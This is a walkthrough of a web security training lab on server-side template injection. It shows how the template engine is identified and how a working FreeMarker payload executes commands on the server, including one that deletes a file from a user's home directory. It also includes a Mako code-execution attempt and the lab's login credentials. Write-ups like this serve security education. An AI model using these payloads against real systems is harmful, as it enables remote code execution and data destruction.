# Server-Side Template Injection — Solved via Documentation

This lab is exploitable through server-side template injection. The goal is to figure out which template engine is in use, then use its documentation to work out how to execute arbitrary code, and use that to delete `morale.txt` from Carlos's home directory.

Login credentials for your own account: content-manager:C0nt3ntM4n4g3r

Hint: Try to solve this one using only the official documentation. If you're really stuck, there's a well-known exploit by @albinowax that can help.

---



<img width="774" height="409" alt="1" src="https://github.com/user-attachments/assets/ad5c0d0e-b453-409a-91ae-f52b338dca3d" />


---

The post templates can be edited directly:

<img width="658" height="216" alt="2" src="https://github.com/user-attachments/assets/0d844b51-1b54-4e14-baaf-c695ee2e2afd" />


Values calculated in the format `${product.X}` show up in the page:

<img width="1149" height="557" alt="3" src="https://github.com/user-attachments/assets/3d49a8f1-083e-44b4-9dfa-1d5a14113eaf" />


Testing with this payload works:

```
${3*3}
```

<img width="372" height="311" alt="4" src="https://github.com/user-attachments/assets/6221b368-92a9-4481-afe2-5b88b321bd73" />


Trying the Mako example payload produced an error instead:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

<img width="1147" height="343" alt="5" src="https://github.com/user-attachments/assets/5853b585-8fab-4eb6-94bd-68ca04e3545f" />


The correct payload format turns out to be:

```
${"freemarker.template.utility.Execute"?new()("id")}
```

<img width="778" height="438" alt="6" src="https://github.com/user-attachments/assets/bb779fde-eb67-491f-8d74-538d0554557a" />


Payload used to delete the file:

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```
